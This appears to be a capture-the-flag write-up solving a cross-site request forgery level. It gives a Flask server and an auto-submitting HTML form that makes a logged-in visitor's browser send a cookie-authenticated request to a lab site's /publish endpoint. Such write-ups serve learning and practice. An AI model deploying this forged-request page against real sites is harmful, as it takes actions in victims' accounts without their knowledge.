For this level, we need to make a website that would forge a user request to show us the flag. The user cookie is the thing that will authenticate actions from the user. What we need is to make a website that runs on `http://hacker.localhost:1337` that, once the user visit that site, will send a request to `http://challenge.localhost:80/publish`. Because the user has already logged into their account, their browser now holds their session cookie, which will be used to validate any request to the website from the user.

Our website will take advantage of that, we'll make it so that when the user visit our website, we'll send a request to the `/publish` endpoint, and because the user is already logged in, the request will use the session cookie of the user to authenticate.

We need to setup a server that will run on port 1337. This server will just render the website.

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

app.run("hacker.localhost", 1337)
```

Now we'll need our website, which will contain our exploit.

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form method="GET" action="http://challenge.localhost/publish"></form>
    <script>document.forms[0].submit()</script>
</body>
</html>
```